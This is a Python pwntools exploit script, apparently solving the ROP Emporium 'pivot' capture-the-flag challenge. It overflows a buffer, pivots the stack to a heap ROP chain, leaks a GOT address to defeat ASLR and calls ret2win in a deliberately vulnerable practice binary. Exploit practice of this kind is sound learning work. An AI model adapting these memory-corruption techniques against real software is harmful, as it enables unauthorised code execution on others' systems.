#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF(args.EXE or 'pivot', checksec=False)
libc = elf.libc

foothold_got = elf.got['foothold_function']
foothold_fuction = elf.plt['foothold_function']
puts = elf.plt['puts']
main  = elf.symbols['main']
ret2win_offset = 0x00a81
foothold_offset = 0x000000000000096a
pop_rax = p64(0x00000000004009bb)
pop_rdi = p64(0x0000000000400a33)
xchg_rax_rsp = p64(0x00000000004009bd)
offset = b'A' * 40

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
break *pwnme+180
continue
'''.format(**locals())

# saving the heap addr that is printed
io = start()
io.recvuntil(b'libpivot\n')
heap_addr_rop_chain = io.recvline()
heap_addr_rop_chain = int((heap_addr_rop_chain.split(b':')[1].strip()).decode(), 16)
print(f'\n[*] Got the heap address that was printed: {hex(heap_addr_rop_chain)}')

# rop chain on the heap
rop_chain_heap = [
    p64(foothold_fuction),
    pop_rdi,
    p64(foothold_got),
    p64(puts),
    p64(main)
]
io.sendlineafter(b'> ', b''.join(rop_chain_heap))
print(f'[*] Sent a rop chain to that address now!')

print('[*] Sending the overflow and pivoting the stack to the heap')
# the overflow itself and PIVOTING the stack :)
stack_smash = [
    offset,
    pop_rax,
    p64(heap_addr_rop_chain),
    xchg_rax_rsp
]
io.sendafter(b'> ', b''.join(stack_smash))

# leaking foothold_function() address from got.plt
io.recvuntil(b'libpivot\n')
foothold_addr = u64(io.recvline().strip().ljust(8, b'\x00'))  # NOTE: sometimes, puts() doesn't print the address correctly because it stops printing when it reaches an \x00 (null terimantor), and sometimes the address' base has \x00 in the middle, so puts() will print it half way
print(f'[**] Got a leak from libpivot: {hex(foothold_addr)}')

# calculating ret2win()' address based on foothold_function()' base address
libpivot_base = foothold_addr - foothold_offset  # [*] NOTE - "foothold_addr & ~0xfffff" will do the same because it resets the last 5 bytes of foothold_addr and keeps the other bytes the same (thus we get the base and discard the foothold()' offset)
ret2win_addr = libpivot_base + ret2win_offset
print(f'[***] Calculated ret2win() address: {hex(ret2win_addr)}')

print(f'[***] Calling main() once again')

# sending first payload
print(f'[****] Sending garbage to the heap address')
io.sendlineafter(b'> ', b'junk')


print(f'[*****] Sending an overflow and calling ret2win:\n')
last_stack_smash = [
    offset,
    p64(ret2win_addr) 
]
io.sendlineafter(b'> ', b''.join(last_stack_smash))

io.interactive()